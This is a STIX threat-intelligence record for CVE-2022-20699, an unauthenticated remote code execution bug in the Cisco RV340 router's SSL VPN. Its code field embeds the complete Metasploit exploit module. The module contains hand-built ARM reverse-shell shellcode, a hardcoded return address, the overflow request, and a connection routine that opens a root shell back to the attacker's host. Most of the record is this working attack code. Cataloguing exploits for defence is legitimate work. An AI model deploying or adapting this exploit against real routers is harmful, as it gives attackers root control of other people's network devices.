{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--374b1982-73ce-44a9-8574-2a47c27d3ce2",
    "created": "2024-08-14T16:57:14.82294Z",
    "modified": "2024-08-14T16:57:14.822944Z",
    "name": "Cisco RV340 SSL VPN Unauthenticated Remote Code Execution",
    "description": " This module exploits a stack buffer overflow in the Cisco RV series routers SSL VPN functionality. The default SSL VPN configuration is exploitable, with no authentication required and works over the Internet! The stack is executable and no ASLR is in place, which makes exploitation easier. Successful execution of this module results in a reverse root shell. A custom payload is used as Metasploit does not have ARMLE null free shellcode. This vulnerability was presented by the Flashback Team in Pwn2Own Austin 2021 and OffensiveCon 2022. For more information check the referenced advisory. This module has been tested in firmware versions 1.0.03.15 and above and works with around 65% reliability. The service restarts automatically so you can keep trying until you pwn it. Only the RV340 router was tested, but other RV series routers should work out of the box. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/cisco_rv340_sslvpn.rb",
            "external_id": "cisco_rv340_sslvpn.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-20699"
        },
        {
            "source_name": "reference",
            "url": "https://www.youtube.com/watch?v=O1uK_b1Tmts"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Austin_2021/flashback_connects/flashback_connects.md"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Austin2021/flashback_connects/flashback_connects.md"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-smb-mult-vuln-KA9PK6D.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cisco RV340 SSL VPN Unauthenticated Remote Code Execution',\n        'Description' => %q{\n          This module exploits a stack buffer overflow in the Cisco RV series routers SSL VPN\n          functionality. The default SSL VPN configuration is exploitable, with no authentication\n          required and works over the Internet!\n          The stack is executable and no ASLR is in place, which makes exploitation easier.\n          Successful execution of this module results in a reverse root shell. A custom payload is\n          used as Metasploit does not have ARMLE null free shellcode.\n          This vulnerability was presented by the Flashback Team in Pwn2Own Austin 2021 and OffensiveCon\n          2022. For more information check the referenced advisory.\n          This module has been tested in firmware versions 1.0.03.15 and above and works with around\n          65% reliability. The service restarts automatically so you can keep trying until you pwn it.\n          Only the RV340 router was tested, but other RV series routers should work out of the box.\n        },\n        'Author' => [\n          'Pedro Ribeiro <pedrib@gmail.com>', # Vulnerability discovery and Metasploit module\n          'Radek Domanski <radek.domanski[at]gmail.com>' # Vulnerability discovery and Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => 'linux',\n        'References' => [\n          ['CVE', '2022-20699'],\n          ['URL', 'https://www.youtube.com/watch?v=O1uK_b1Tmts'],\n          ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Austin_2021/flashback_connects/flashback_connects.md'],\n          ['URL', 'https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Austin2021/flashback_connects/flashback_connects.md'],\n          ['URL', 'https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-smb-mult-vuln-KA9PK6D.html'],\n        ],\n        'Arch' => ARCH_ARMLE,\n        # We actually use our own shellcode because Metasploit doesn't have ARM encoders!\n        'DefaultOptions' => { 'PAYLOAD' => 'linux/armle/shell_reverse_tcp' },\n        'Targets' => [\n          [\n            'Cisco RV340 Firmware Version <= 1.0.03.24',\n            {\n              # Shellcode location on stack (rwx stack, seriously Cisco...)\n              # The same for all vulnerable firmware versions: 0x704aed98 (+ 1 for thumb)\n              #\n              # NOTE: this is the shellcode location about 65% of the time. The rest is at\n              # The remaining 35% will land at 0x704f6d98, causing this sploit will fail.\n              # There's no way to guess it, but the service will restart again, so let's stick\n              # with the most common stack address.\n              'Shellcode' => \"\\x99\\xed\\x4a\\x70\"\n            }\n          ],\n        ],\n        'DisclosureDate' => '2022-02-02',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SERVICE_RESTARTS],\n          # repeatable... but only works 65% of the time, see comments above\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => []\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(8443),\n        OptBool.new('SSL', [true, 'Use SSL', true])\n      ]\n    )\n  end\n\n  def check\n    # This should return a string like:\n    # \"The Cisco AnyConnect VPN Client is required to connect to the SSLVPN server.\" (plus another phrase)\n    res = send_request_cgi({ 'uri' => '/login.html' })\n    if res && res.code == 200 && res.body.include?('The Cisco AnyConnect VPN Client is required to connect to the SSLVPN server')\n      Exploit::CheckCode::Detected\n    else\n      Exploit::CheckCode::Unknown\n    end\n  end\n\n  def hex_to_bin(int)\n    hex = int.to_s(16)\n    if (hex.length == 1) || (hex.length == 3)\n      hex = '0' + hex\n    end\n    hex.scan(/../).map { |x| x.hex.chr }.join\n  end\n\n  def prep_shelly\n    # We need to roll our own shellcode, as Metasploit doesn't have encoders for ARMLE.\n    # A null free shellcode is needed, as this memory corruption is done through `strcat()`\n    #\n    # SHELLCODE_START:\n    # // Original shellcode from Azeria Labs aka @Fox0x01's blog, specifically\n    # // https://azeria-labs.com/tcp-reverse-shell-in-assembly-arm-32-bit/\n    # // Expanded and Improved by the Flashback Team\n    # .global _start\n    # _start:\n    # .THUMB\n    # // socket(2, 1, 0)\n    # mov   r0, #2\n    # mov   r1, #1\n    # sub   r2, r2\n    # mov   r7, #200\n    # add   r7, #81       // r7 = 281 (socket)\n    # svc   #1            // r0 = resultant sockfd\n    # mov   r4, r0        // save sockfd in r4\n    #\n    # // connect(r0, &sockaddr, 16)\n    # adr   r1, struct    // pointer to address, port\n    # strb  r2, [r1, #1]  // write 0 for AF_INET\n    # mov   r2, #16\n    # add   r7, #2        // r7 = 283 (connect)\n    # svc   #1\n    #\n    # // dup2(sockfd, 0)\n    # mov   r7, #63       // r7 = 63 (dup2)\n    # mov   r0, r4        // r4 is the saved sockfd\n    # sub   r1, r1        // r1 = 0 (stdin)\n    # svc   #1\n    # // dup2(sockfd, 1)\n    # mov   r0, r4        // r4 is the saved sockfd\n    # mov   r1, #1        // r1 = 1 (stdout)\n    # svc   #1\n    # // dup2(sockfd, 2)\n    # mov   r0, r4        // r4 is the saved sockfd\n    # mov   r1, #2        // r1 = 2 (stderr)\n    # svc   #1\n    #\n    # // execve(\"/bin/sh\", 0, 0)\n    # adr   r0, binsh\n    # sub   r2, r2\n    # sub   r1, r1\n    # strb  r2, [r0, #7]\n    # push  {r0, r2}\n    # mov   r1, sp\n    # cpy   r2, r1\n    # mov   r7, #11       // r7 = 11 (execve)\n    # svc   #1\n    #\n    # eor  r7, r7, r7\n    #\n    # struct:\n    # .ascii \"\\x02\\xff\"   // AF_INET 0xff will be NULLed\n    # .ascii \"\\x11\\x5d\"   // port number 4445\n    # .byte 5,5,5,1       // IP Address\n    # binsh:\n    # .ascii \"/bin/shX\"\n    # SHELLCODE_END\n    #\n    # Since we need to be null free, we have a very specific corner case, for addresses:\n    #   X.0.Y.Z\n    #   X.Y.0.Z\n    #   X.Y.Z.0\n    #   X.0.0.Y\n    #   X.Y.0.0\n    #   X.0.Y.0\n    #   X.0.0.0\n    # These will contain a null byte for the each zero in the address.\n    #\n    # To fix this we add additional instructions to the shellcode and replace the null byte(s).\n    #   adr   r1, struct      // pointer to address, port\n    #   strb  r2, [r1, #5]    // write 0 for X.0.Y.Z (second octet)\n    #   adr   r1, struct      // pointer to address, port\n    #   strb  r2, [r1, #6]    // write 0 for X.Y.0.Z (third octet)\n    #   adr   r1, struct      // pointer to address, port\n    #   strb  r2, [r1, #7]    // write 0 for X.Y.Z.0 (last octet)\n    #\n\n    # The following is used to convert LHOST and LPORT for shellcode inclusion\n    lport_h = hex_to_bin(lport)\n    lhost_h = ''\n    jump = 0xc\n    datastore['LHOST'].split('.').each do |n|\n      octet = hex_to_bin(n.to_i)\n      if octet == \"\\x00\"\n        # Why we do this? Check comments below my fren\n        jump += 1\n      end\n      lhost_h += octet\n    end\n    lhost_h = lhost_h.force_encoding('binary')\n\n    # As part of the shellcode, we need to do:\n    #   adr   r1, struct      // pointer to address, port\n    #   strb  r2, [r1, #1]    // write 0 for AF_INET\n    #\n    # In order to do the \"adr\", we need to know where \"struct\" is. On an unmodified\n    # shellcode, this is \"\\x0c\\xa1\\x4a\\x70\".\n    # But if we have one or more null bytes in the LHOST, we need to add more instructions.\n    # This means the \"\\x0c\", the distance from $pc to \"struct, is going to be either\n    # \"\\x0d, \"\\x0e\" or \"\\x0f\".\n    # Long story short, this distance is the jump variable, and we need to calculate it\n    # properly the more instructions we add.\n    #\n    # This is our jump, now calculated with the additional (or not) instructions:\n    ins = hex_to_bin(jump) + \"\\xa1\\x4a\\x70\"\n    jump -= 1\n\n    # And now we calculate all the null bytes we have, replace them with \\xff and add\n    # the proper jump:\n    for i in 1..3 do\n      next unless lhost_h[i] == \"\\x00\"\n\n      ins_add = ''\n      lhost_h[i] = \"\\xff\"\n      if i == 1\n        # strb  r2, [r1, #5]    // write 0 for X.0.Y.Z (second octet)\n        ins_add = \"\\x4a\\x71\"\n      elsif i == 2\n        # strb  r2, [r1, #6]    // write 0 for X.Y.0.Z (third octet)\n        ins_add = \"\\x8a\\x71\"\n      elsif i == 3\n        # strb  r2, [r1, #7]    // write 0 for X.Y.Z.0 (last octet)\n        ins_add = \"\\xca\\x71\"\n      end\n      ins += hex_to_bin(jump) + \"\\xa1\" + ins_add\n      jump -= 1\n    end\n    ins = ins.force_encoding('binary')\n\n    shellcode = \"\\x02\\x20\\x01\\x21\\x92\\x1a\\xc8\\x27\\x51\\x37\\x01\\xdf\\x04\\x1c\" + ins +\n                \"\\x10\\x22\\x02\\x37\\x01\\xdf\\x3f\\x27\\x20\\x1c\\x49\\x1a\\x01\\xdf\\x20\\x1c\\x01\\x21\" \\\n                \"\\x01\\xdf\\x20\\x1c\\x02\\x21\\x01\\xdf\\x06\\xa0\\x92\\x1a\\x49\\x1a\\xc2\\x71\\x05\\xb4\" \\\n                \"\\x69\\x46\\x0a\\x46\\x0b\\x27\\x01\\xdf\\x7f\\x40\\x02\\xff\" + lport_h + lhost_h +\n                \"\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x58\"\n    shelly = shellcode + rand_text_alphanumeric(16400 - shellcode.length) + target['Shellcode']\n    shelly\n  end\n\n  def sock_get(app_host, app_port)\n    begin\n      ctx = { 'Msf' => framework, 'MsfExploit' => self }\n      sock = Rex::Socket.create_tcp(\n        { 'PeerHost' => app_host, 'PeerPort' => app_port, 'Context' => ctx, 'Timeout' => 10 }\n      )\n    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError\n      sock.close if sock\n    end\n    if sock.nil?\n      fail_with(Failure::Unknown, 'Failed to connect to the chosen application')\n    end\n\n    # also need to add support for old ciphers\n    ctx = OpenSSL::SSL::SSLContext.new\n    ctx.min_version = OpenSSL::SSL::SSL3_VERSION\n    ctx.security_level = 0\n    ctx.verify_mode = OpenSSL::SSL::VERIFY_NONE\n    s = OpenSSL::SSL::SSLSocket.new(sock, ctx)\n    s.sync_close = true\n    s.connect\n    return s\n  end\n\n  def exploit\n    print_status(\"#{peer} - Pwning #{target.name}\")\n    payload = prep_shelly\n    begin\n      sock = sock_get(rhost, rport)\n      # With the base request, our shellcode will be about 0x12a from $sp when we take control.\n      #\n      # But we noticed that by adding more filler in the request we can have better reliability.\n      # So let's use 0x86 as filler and dump the filler in the URL! This number is arbitrary and\n      # can be increased / decreased, but we find 0x86 works well.\n      # (this means our shellcode address in the target definition above is $sp + 0x12a + 0x86)\n      #\n      # It would be good to add some valid headers with semi random data for proper evasion :D\n      http = 'POST /' + rand_text_alphanumeric(0x86) + \" HTTP/1.1\\r\\nContent-Length: 16404\\r\\n\\r\\n\"\n\n      sock.write(http)\n      sock.write(payload)\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the router\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-02-02",
    "x_mitre_platforms": [
        "linux'"
    ]
}